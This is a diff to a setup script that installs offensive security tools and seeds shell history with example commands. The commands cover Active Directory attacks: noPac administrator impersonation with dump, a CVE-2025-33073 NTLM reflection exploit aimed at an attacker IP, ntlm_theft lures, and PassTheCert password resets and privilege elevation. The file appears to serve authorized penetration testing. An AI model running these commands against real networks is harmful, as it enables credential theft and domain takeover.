@@ -160,6 +160,8 @@ echo "alias install-burp='$WEB_DIR/Burp/BurpCommunity'" >> ~/.zshrc
 cd $INTERNALS_DIR
 pipx install git+https://github.com/ly4k/Certipy || echo "[-] Failed to install Certipy"
 echo "certipy find -u '\$USER@\$DOMAIN' -p '\$PASS' -dc-ip \$PASS [-vulnerable]" >> ~/.zsh_history
+echo "certipy cert -pfx user.pfx -nokey -out user.crt" >> ~/.zsh_history
+echo "certipy cert -pfx user.pfx -nocert -out user.key" >> ~/.zsh_history
 
 # Chisel
 cd $INTERNALS_DIR
@@ -664,8 +666,7 @@ echo "nmap -p- -Pn -sV -oA nmap_result \$IP" >> ~/.zsh_history
 cd $WEB_DIR
 git clone https://github.com/devploit/nomore403.git
 cd nomore403
-wget https://github.com/devploit/nomore403/releases/download/v1.1.1/nomore403_linux_amd64
-mv nomore403_linux_amd64 nomore403
+wget https://github.com/devploit/nomore403/releases/download/v1.1.8/nomore403_linux_amd64 -O nomore403
 chmod +x nomore403
 echo "alias nomore403='$WEB_DIR/nomore403/nomore403'" >> ~/.zshrc
 echo "nomore403 -u 'https://example.com/admin'" >> ~/.zsh_history
@@ -679,7 +680,7 @@ source bin/activate
 pip3 install -r requirements.txt
 deactivate
 echo "alias noPac='$INTERNALS_DIR/noPac/bin/python3 $INTERNALS_DIR/noPac/noPac.py'" >> ~/.zshrc
-echo "python noPac.py 'domain.local/username:password' -dc-ip 192.168.1.1 -dc-host mydc2025 --impersonate administrator -dump" >> ~/.zsh_history
+echo "python noPac.py \$DOMAIN/\$USER:\$PASS' -dc-ip \$DC -dc-host \$DC_HOST --impersonate administrator -dump" >> ~/.zsh_history
 
 # NTLMRecon
 cd $RECON_DIR
@@ -689,6 +690,8 @@ echo "ntlmrecon --input 192.168.1.1/24 --outfile ntlmrecon-ranges.csv" >> ~/.zsh
 # NTLMreflection
 cd $INTERNALS_DIR
 git clone https://github.com/mverschu/CVE-2025-33073.git
+echo "alias ntlmreflection='python3 $INTERNALS_DIR/CVE-2025-33073/CVE-2025-33073.py'" >> ~/.zshrc
+echo "ntlmreflection -u \$DOMAIN\\\$USER -p \$PASS --attacker-ip 192.168.178.49 --dns-ip 192.168.0.1 --dc-fqdn DC01.domain.local --target 192.168.178.65 --target-ip 192.168.178.65 --cli-only --socks" >> ~/.zsh_history
 
 # Ntlmscan
 cd $RECON_DIR
@@ -701,7 +704,7 @@ cd $INTERNALS_DIR
 git clone https://github.com/Greenwolf/ntlm_theft.git
 pipx install xlsxwriter
 echo "alias ntlm_theft='python3 $INTERNALS_DIR/ntlm_theft/ntlm_theft.py'" >> ~/.zshrc
-echo "ntlm_theft -g all -s 127.0.0.1 -f test" >> ~/.zsh_history
+echo "ntlm_theft -g all -s \$KALI-IP -f test" >> ~/.zsh_history
 
 # NTLMv1-multi
 cd $INTERNALS_DIR
@@ -740,6 +743,9 @@ chmod +x setup.sh
 cd $INTERNALS_DIR
 git clone https://github.com/AlmondOffSec/PassTheCert.git
 echo "alias impacket-passthecert='python3 $INTERNALS_DIR/PassTheCert/Python/passthecert.py'" >> ~/.zshrc
+echo "impacket-passthecert -action add_computer -crt user.crt -key user.key -domain \$DOMAIN -dc-ip \$DC" >> ~/.zsh_history
+echo "impacket-passthecert -action modify_user -crt user.crt -key user.key -domain \$DOMAIN -dc-ip \$DC -target user_sam -new-pass" >> ~/.zsh_history
+echo "impacket-passthecert -action modify_user -crt user.crt -key user.key -domain \$DOMAIN -dc-ip \$DC -target user_sam -elevate" >> ~/.zsh_history
 
 # PayloadsAllTheThings
 cd $WEB_DIR
@@ -758,17 +764,17 @@ source bin/activate
 sudo apt-get -y install python3-pip libpcap-dev file && pip3 install Cython && pip3 install python-libpcap || echo "[-] Failed to install PCredz"
 deactivate
 echo "alias PCredz='$INTERNALS_DIR/PCredz/bin/python3 $INTERNALS_DIR/PCredz/Pcredz'" >> ~/.zshrc
-echo "Pcredz -f capture.pcap" >> ~/.zsh_history
+echo "PCredz -f capture.pcap" >> ~/.zsh_history
 
 # PEASS-ng
 cd $INTERNALS_DIR
 mkdir PEASS-ng
 cd PEASS-ng
-wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/winPEAS.bat
-wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/winPEASx64.exe
-wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
-wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas_darwin_amd64
-wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas_linux_amd64
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20251007-02ee8e3f/winPEAS.bat
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20251007-02ee8e3f/winPEASx64.exe
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20251007-02ee8e3f/linpeas.sh
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20251007-02ee8e3f/linpeas_darwin_amd64
+wget https://github.com/peass-ng/PEASS-ng/releases/download/20251007-02ee8e3f/linpeas_linux_amd64
 wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
 wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS-Light.ps1
 
